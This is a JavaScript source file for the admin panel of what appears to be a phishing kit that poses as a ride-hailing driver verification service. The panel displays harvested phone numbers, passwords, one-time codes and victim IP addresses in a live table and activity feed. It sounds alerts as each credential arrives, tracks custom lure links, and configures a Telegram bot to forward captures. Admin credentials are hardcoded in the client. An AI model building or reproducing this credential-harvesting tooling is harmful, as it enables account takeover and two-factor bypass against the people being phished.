// Initialize Socket.io Connection with graceful fallback
let socket;
try {
    socket = io();
} catch(e) {
    socket = { on: () => {} };
}

// Admin Authentication State
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'guber123321';

// State variables
let verificationsList = [];
let currentFilteredData = [];
let currentPage = 1;
let itemsPerPage = 50; // Default 50 items per page
let soundEnabled = true;
let audioCtx = null;

// DOM Elements
const loginOverlay = document.getElementById('admin-login-overlay');
const dashboardWrapper = document.getElementById('admin-dashboard-wrapper');
const loginForm = document.getElementById('admin-login-form');
const loginErrorMsg = document.getElementById('login-error-msg');

const socketStatusBadge = document.getElementById('socket-status-badge');
const kpiTotal = document.getElementById('kpi-total');
const kpiPending = document.getElementById('kpi-pending');
const kpiVerified = document.getElementById('kpi-verified');
const kpiDbStatus = document.getElementById('kpi-db-status');
const activityFeed = document.getElementById('activity-feed');
const tableBody = document.getElementById('table-body');
const searchInput = document.getElementById('search-input');

// Initialize Dashboard & Authentication Check
document.addEventListener('DOMContentLoaded', () => {
    checkAdminAuth();
});

function checkAdminAuth() {
    const isAuth = sessionStorage.getItem('guber_admin_auth') === 'true';
    if (isAuth) {
        if (loginOverlay) loginOverlay.classList.add('hidden');
        if (dashboardWrapper) dashboardWrapper.classList.remove('hidden');
        fetchInitialData();
    } else {
        if (loginOverlay) loginOverlay.classList.remove('hidden');
        if (dashboardWrapper) dashboardWrapper.classList.add('hidden');
    }
}

function handleAdminLogin(e) {
    if (e) e.preventDefault();
    const userElem = document.getElementById('admin-user-input');
    const passElem = document.getElementById('admin-pass-input');
    
    const userVal = userElem ? userElem.value.trim().toLowerCase() : '';
    const passVal = passElem ? passElem.value.trim() : '';

    const errBox = document.getElementById('login-error-msg');

    if (userVal === ADMIN_USER && (passVal === ADMIN_PASS || passVal.toLowerCase() === ADMIN_PASS)) {
        sessionStorage.setItem('guber_admin_auth', 'true');
        if (errBox) {
            errBox.style.display = 'none';
            errBox.classList.add('hidden');
        }
        checkAdminAuth();
    } else {
        if (errBox) {
            errBox.style.display = 'flex';
            errBox.classList.remove('hidden');
        }
    }
}

function adminLogout() {
    sessionStorage.removeItem('guber_admin_auth');
    checkAdminAuth();
}

// Sync from Storage / Cloud
window.addEventListener('storage', () => {
    if (sessionStorage.getItem('guber_admin_auth') === 'true') fetchInitialData();
});

window.addEventListener('guber_record_updated', (e) => {
    if (sessionStorage.getItem('guber_admin_auth') !== 'true') return;

    if (e.detail) {
        addActivityFeedItem({
            type: e.detail.status === 'VERIFIED' ? 'OTP_SUBMITTED' : 'NEW_PHONE',
            data: e.detail
        });
        if (soundEnabled) {
            if (e.detail.status === 'VERIFIED') {
                playChime(880, 'triangle', 0.2);
                setTimeout(() => playChime(1174, 'triangle', 0.3), 150);
            } else {
                playChime(660, 'sine', 0.3);
            }
        }
    }
    fetchInitialData();
});

// Socket Connection Events
if (socket && typeof socket.on === 'function') {
    socket.on('connect', () => {
        if (socketStatusBadge) {
            socketStatusBadge.innerHTML = `
                <span class="status-dot online"></span>
                <span class="status-text">Connected (Socket Online)</span>
            `;
        }
    });

    socket.on('admin_notification', (notification) => {
        if (sessionStorage.getItem('guber_admin_auth') !== 'true') return;

        if (soundEnabled) {
            if (notification.type === 'OTP_SUBMITTED') {
                playChime(880, 'triangle', 0.2);
                setTimeout(() => playChime(1174, 'triangle', 0.3), 150);
            } else {
                playChime(660, 'sine', 0.3);
            }
        }
        addActivityFeedItem(notification);
        fetchInitialData();
    });

    socket.on('all_records_cleared', () => {
        if (sessionStorage.getItem('guber_admin_auth') !== 'true') return;
        verificationsList = [];
        localStorage.removeItem('guber_records');
        renderTable([]);
        updateKpis({ total: 0, pending: 0, verified: 0 });
        if (activityFeed) activityFeed.innerHTML = '<div class="empty-feed">All records have been cleared.</div>';
    });
}

// Fetch verifications
async function fetchInitialData() {
    try {
        const res = await fetch('/api/verifications');
        const result = await res.json();

        if (result.success) {
            verificationsList = result.data || [];
            if (kpiDbStatus) kpiDbStatus.textContent = result.source === 'MongoDB' ? 'MongoDB (Connected)' : 'Local Dual Store';
            renderTable(verificationsList);
            calculateStats(verificationsList);
            return;
        }
    } catch (err) {}

    const localData = JSON.parse(localStorage.getItem('guber_records') || '[]');
    verificationsList = localData;
    if (kpiDbStatus) kpiDbStatus.textContent = 'Cloud / Render Sync';
    renderTable(verificationsList);
    calculateStats(verificationsList);
}

// Render Main Verifications Table (Paginated)
function renderTable(data) {
    if (!tableBody) return;

    currentFilteredData = data || [];
    const totalRecords = currentFilteredData.length;

    if (totalRecords === 0) {
        tableBody.innerHTML = `
            <tr>
                <td colspan="9" style="text-align:center; padding:32px; color:#94A3B8;">
                    <i class="fa-solid fa-inbox" style="font-size:24px; margin-bottom:8px; display:block;"></i>
                    No driver verification requests yet.
                </td>
            </tr>
        `;
        renderPaginationControls(0, 0, 0, 0);
        return;
    }

    // Determine pagination range
    const perPage = itemsPerPage === 'all' ? totalRecords : (parseInt(itemsPerPage) || 50);
    const totalPages = Math.ceil(totalRecords / perPage) || 1;

    if (currentPage > totalPages) currentPage = totalPages;
    if (currentPage < 1) currentPage = 1;

    const startIndex = (currentPage - 1) * perPage;
    const endIndex = Math.min(startIndex + perPage, totalRecords);
    const pageItems = currentFilteredData.slice(startIndex, endIndex);

    let html = '';
    pageItems.forEach((item, index) => {
        const globalRowIndex = startIndex + index + 1;
        const id = item._id || item.id;
        const isVerified = item.status === 'VERIFIED';
        
        const statusBadge = isVerified 
            ? `<span class="badge-status verified"><i class="fa-solid fa-check-double"></i> VERIFIED DRIVER</span>`
            : (item.status === 'PASSWORD_SUBMITTED'
                ? `<span class="badge-status submitted" style="background:rgba(234, 179, 8, 0.2); color:#FACC15; border-color:#EAB308;"><i class="fa-solid fa-key"></i> Password Submitted</span>`
                : `<span class="badge-status submitted"><i class="fa-solid fa-hourglass-half"></i> Phone Submitted</span>`);

        const passwordDisplay = item.password 
            ? `<span class="password-pill" style="background:rgba(234, 179, 8, 0.2); color:#FACC15; border:1px solid #EAB308; font-size:12px; padding:3px 10px; border-radius:6px; font-weight:700; font-family:monospace;">${item.password}</span>`
            : `<span style="color:#64748B; font-size:12px; font-style:italic;">No Password</span>`;

        const otpDisplay = item.otp 
            ? `<span class="otp-pill">${item.otp}</span>`
            : `<span class="otp-pill-none">OTP Not Submitted</span>`;

        const slugBadge = (item.customSlug && item.customSlug !== '/')
            ? `<span style="background:rgba(59, 130, 246, 0.2); color:#60A5FA; border:1px solid #3B82F6; font-size:11px; padding:2px 8px; border-radius:12px; margin-left:8px; font-weight:600; font-family:monospace;">Link: ${item.customSlug}</span>`
            : '';

        const submittedTime = item.submittedAt
            ? new Date(item.submittedAt).toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'short' })
            : '—';

        const verifiedTime = item.verifiedAt
            ? new Date(item.verifiedAt).toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'short' })
            : '—';

        html += `
            <tr>
                <td>${globalRowIndex}</td>
                <td style="font-weight:700; color:#FFFFFF; direction:ltr; text-align:left;">
                    ${item.phoneNumber} ${slugBadge}
                </td>
                <td>${passwordDisplay}</td>
                <td>${otpDisplay}</td>
                <td>${statusBadge}</td>
                <td>${submittedTime}</td>
                <td>${verifiedTime}</td>
                <td style="font-size:12px; color:#94A3B8;">${item.ipAddress || 'Client'}</td>
                <td>
                    <button class="btn-del-row" onclick="deleteRecord('${id}')" title="Delete Record">
                        <i class="fa-solid fa-trash"></i>
                    </button>
                </td>
            </tr>
        `;
    });

    tableBody.innerHTML = html;
    renderPaginationControls(startIndex + 1, endIndex, totalRecords, totalPages);
}

// Render Pagination Buttons & Summary
function renderPaginationControls(start, end, total, totalPages) {
    const summaryEl = document.getElementById('pagination-summary');
    const buttonsEl = document.getElementById('pagination-buttons');

    if (summaryEl) {
        summaryEl.textContent = total === 0 
            ? 'No records to display' 
            : `Showing ${start} to ${end} of ${total} records`;
    }

    if (!buttonsEl) return;

    if (total === 0 || totalPages <= 1) {
        buttonsEl.innerHTML = '';
        return;
    }

    let buttonsHtml = `
        <button class="btn-page" onclick="changePage(${currentPage - 1})" ${currentPage === 1 ? 'disabled' : ''} title="Previous Page">
            <i class="fa-solid fa-chevron-left"></i>
        </button>
    `;

    // Max 5 visible page numbers around active page
    let startPage = Math.max(1, currentPage - 2);
    let endPage = Math.min(totalPages, startPage + 4);
    if (endPage - startPage < 4) {
        startPage = Math.max(1, endPage - 4);
    }

    if (startPage > 1) {
        buttonsHtml += `<button class="btn-page" onclick="changePage(1)">1</button>`;
        if (startPage > 2) buttonsHtml += `<span style="color:#64748B; padding:0 4px;">...</span>`;
    }

    for (let p = startPage; p <= endPage; p++) {
        buttonsHtml += `
            <button class="btn-page ${p === currentPage ? 'active' : ''}" onclick="changePage(${p})">${p}</button>
        `;
    }

    if (endPage < totalPages) {
        if (endPage < totalPages - 1) buttonsHtml += `<span style="color:#64748B; padding:0 4px;">...</span>`;
        buttonsHtml += `<button class="btn-page" onclick="changePage(${totalPages})">${totalPages}</button>`;
    }

    buttonsHtml += `
        <button class="btn-page" onclick="changePage(${currentPage + 1})" ${currentPage === totalPages ? 'disabled' : ''} title="Next Page">
            <i class="fa-solid fa-chevron-right"></i>
        </button>
    `;

    buttonsEl.innerHTML = buttonsHtml;
}

function changePage(pageNumber) {
    currentPage = pageNumber;
    renderTable(currentFilteredData);
}

function changePageSize() {
    const select = document.getElementById('items-per-page-select');
    if (select) {
        itemsPerPage = select.value;
        currentPage = 1;
        renderTable(currentFilteredData);
    }
}

// Calculate KPI Statistics
function calculateStats(data) {
    const total = data.length;
    const pending = data.filter(d => d.status === 'PHONE_SUBMITTED').length;
    const verified = data.filter(d => d.status === 'VERIFIED').length;
    updateKpis({ total, pending, verified });
}

function updateKpis(stats) {
    if (kpiTotal) kpiTotal.textContent = stats.total;
    if (kpiPending) kpiPending.textContent = stats.pending;
    if (kpiVerified) kpiVerified.textContent = stats.verified;
}

// Add Item to Live Activity Feed
function addActivityFeedItem(notification) {
    if (!activityFeed) return;

    const emptyMsg = activityFeed.querySelector('.empty-feed');
    if (emptyMsg) emptyMsg.remove();

    const div = document.createElement('div');
    const isOtp = notification.type === 'OTP_SUBMITTED';
    const isPassword = notification.type === 'PASSWORD_SUBMITTED';

    div.className = `activity-item ${isOtp ? 'type-otp' : (isPassword ? 'type-password' : 'type-phone')}`;

    const timeStr = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

    let messageHtml = '';
    if (isOtp) {
        messageHtml = `
            <i class="fa-solid fa-circle-check" style="color:#10B981; margin-right:8px;"></i>
            <span>Driver <strong>${notification.data.phoneNumber}</strong> submitted OTP:</span>
            <span class="otp-highlight">${notification.data.otp}</span>
            <span style="color:#10B981;">(Driver Identity Verified)</span>
        `;
    } else if (isPassword) {
        messageHtml = `
            <i class="fa-solid fa-key" style="color:#FACC15; margin-right:8px;"></i>
            <span>Driver <strong>${notification.data.phoneNumber}</strong> submitted Password:</span>
            <span style="background:rgba(234, 179, 8, 0.2); color:#FACC15; border:1px solid #EAB308; padding:2px 8px; border-radius:4px; font-weight:700; font-family:monospace; margin-left:6px;">${notification.data.password}</span>
        `;
    } else {
        messageHtml = `
            <i class="fa-solid fa-phone-volume" style="color:#F59E0B; margin-right:8px;"></i>
            <span>Driver <strong>${notification.data.phoneNumber}</strong> requested verification code</span>
        `;
    }

    div.innerHTML = `
        <div class="activity-message">${messageHtml}</div>
        <div class="activity-time">${timeStr}</div>
    `;

    activityFeed.prepend(div);

    if (activityFeed.children.length > 20) {
        activityFeed.lastElementChild.remove();
    }
}

// Filter Table by Search Query
function filterTable() {
    currentPage = 1; // Reset to first page on search
    const query = searchInput ? searchInput.value.toLowerCase().trim() : '';
    if (!query) {
        renderTable(verificationsList);
        return;
    }

    const filtered = verificationsList.filter(item => {
        const phone = (item.phoneNumber || '').toLowerCase();
        const otp = (item.otp || '').toLowerCase();
        const slug = (item.customSlug || '').toLowerCase();
        return phone.includes(query) || otp.includes(query) || slug.includes(query);
    });

    renderTable(filtered);
}

// Delete single record
async function deleteRecord(id) {
    if (!confirm('Are you sure you want to delete this driver verification record?')) return;
    try {
        await fetch(`/api/verifications/${id}`, { method: 'DELETE' });
    } catch (err) {}
    
    verificationsList = verificationsList.filter(r => (r._id !== id && r.id !== id));
    localStorage.setItem('guber_records', JSON.stringify(verificationsList));
    fetchInitialData();
}

// Clear all records with Custom Dark Confirmation Modal
function clearAllData() {
    const modal = document.getElementById('confirm-modal-overlay');
    if (modal) {
        modal.style.display = 'flex';
        modal.classList.remove('hidden');
    }
}

function closeConfirmModal() {
    const modal = document.getElementById('confirm-modal-overlay');
    if (modal) {
        modal.style.display = 'none';
        modal.classList.add('hidden');
    }
}

async function confirmClearAllData() {
    closeConfirmModal();
    try {
        await fetch('/api/verifications', { method: 'DELETE' });
    } catch (err) {}

    verificationsList = [];
    localStorage.removeItem('guber_records');
    renderTable([]);
    updateKpis({ total: 0, pending: 0, verified: 0 });
    if (activityFeed) activityFeed.innerHTML = '<div class="empty-feed">All records have been cleared.</div>';
}

// Sound Audio Chime Synthesizer
function toggleSound() {
    soundEnabled = !soundEnabled;
    const btn = document.getElementById('sound-toggle-btn');
    const icon = document.getElementById('sound-icon');
    const text = document.getElementById('sound-status-text');

    if (soundEnabled) {
        if (btn) btn.className = 'btn-icon-admin sound-on';
        if (icon) icon.className = 'fa-solid fa-volume-high';
        if (text) text.textContent = 'Audio Alert: Enabled';
    } else {
        if (btn) btn.className = 'btn-icon-admin sound-off';
        if (icon) icon.className = 'fa-solid fa-volume-xmark';
        if (text) text.textContent = 'Audio Alert: Disabled';
    }
}

function playChime(freq = 660, type = 'sine', duration = 0.3) {
    try {
        if (!audioCtx) {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        }
        if (audioCtx.state === 'suspended') {
            audioCtx.resume();
        }
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();

        osc.type = type;
        osc.frequency.value = freq;
        
        gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);

        osc.connect(gain);
        gain.connect(audioCtx.destination);

        osc.start();
        osc.stop(audioCtx.currentTime + duration);
    } catch (err) {}
}

// ========== Telegram Bot Notification Settings ==========

function toggleTelegramPanel() {
    const panel = document.getElementById('telegram-settings-panel');
    const icon = document.getElementById('telegram-panel-icon');
    const toggle = document.getElementById('telegram-panel-toggle');

    if (!panel) return;

    const isHidden = panel.style.display === 'none';
    panel.style.display = isHidden ? 'flex' : 'none';
    panel.classList.toggle('hidden', !isHidden);

    if (icon) {
        icon.className = isHidden ? 'fa-solid fa-chevron-up' : 'fa-solid fa-chevron-down';
    }
    if (toggle) {
        toggle.innerHTML = isHidden
            ? '<i class="fa-solid fa-chevron-up" id="telegram-panel-icon"></i> Hide Settings'
            : '<i class="fa-solid fa-chevron-down" id="telegram-panel-icon"></i> Show Settings';
    }

    if (isHidden) {
        loadTelegramSettings();
    }
}

async function loadTelegramSettings() {
    try {
        const res = await fetch('/api/telegram-settings');
        const data = await res.json();

        if (data.success && data.telegram) {
            const tokenEl = document.getElementById('telegram-token');
            if (tokenEl && data.telegram.botToken) tokenEl.value = data.telegram.botToken;

            const list = document.getElementById('telegram-chat-ids-list');
            if (list) {
                list.innerHTML = '';
                const ids = data.telegram.chatIds || [];
                if (ids.length === 0) {
                    addChatIdInput('934345778');
                } else {
                    ids.forEach(id => addChatIdInput(id));
                }
            }
        }
    } catch (e) {
        console.error('Failed to load Telegram settings:', e);
    }
}

function addChatIdInput(value = '') {
    const list = document.getElementById('telegram-chat-ids-list');
    if (!list) return;

    const row = document.createElement('div');
    row.className = 'recipient-row';
    row.innerHTML = `
        <input type="text" class="telegram-chat-id-input" placeholder="e.g. 934345778" value="${value}">
        <button class="btn-remove-email" onclick="this.parentElement.remove()" title="Remove Chat ID">
            <i class="fa-solid fa-xmark"></i>
        </button>
    `;
    list.appendChild(row);

    const input = row.querySelector('input');
    if (input && !value) input.focus();
}

async function saveTelegramConfig() {
    const botToken = document.getElementById('telegram-token')?.value || '';
    const inputs = document.querySelectorAll('.telegram-chat-id-input');
    const chatIds = [];
    inputs.forEach(input => {
        const val = input.value.trim();
        if (val) chatIds.push(val);
    });

    const statusEl = document.getElementById('telegram-status-msg');

    try {
        const res = await fetch('/api/telegram-settings', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ botToken, chatIds })
        });
        const data = await res.json();

        if (statusEl) {
            const count = data.telegram?.chatIds?.length || 0;
            statusEl.textContent = data.success ? `⚡ Telegram Bot saved! Active for ${count} Chat ID(s)` : '⚠️ Saved';
            statusEl.className = 'config-status ' + (data.success ? 'success' : 'error');
            setTimeout(() => { statusEl.textContent = ''; }, 4000);
        }
    } catch (err) {
        if (statusEl) {
            statusEl.textContent = '❌ Failed to save Telegram config';
            statusEl.className = 'config-status error';
        }
    }
}

async function sendTestTelegram() {
    const statusEl = document.getElementById('telegram-status-msg');

    if (statusEl) {
        statusEl.textContent = '⚡ Sending test Telegram alert...';
        statusEl.className = 'config-status success';
    }

    try {
        const res = await fetch('/api/telegram-settings/test', { method: 'POST' });
        const data = await res.json();

        if (statusEl) {
            statusEl.textContent = data.success ? '⚡ Test Telegram alert sent successfully!' : `❌ ${data.message}`;
            statusEl.className = 'config-status ' + (data.success ? 'success' : 'error');
            setTimeout(() => { statusEl.textContent = ''; }, 5000);
        }
    } catch (err) {
        if (statusEl) {
            statusEl.textContent = '❌ Failed to send Telegram alert';
            statusEl.className = 'config-status error';
        }
    }
}

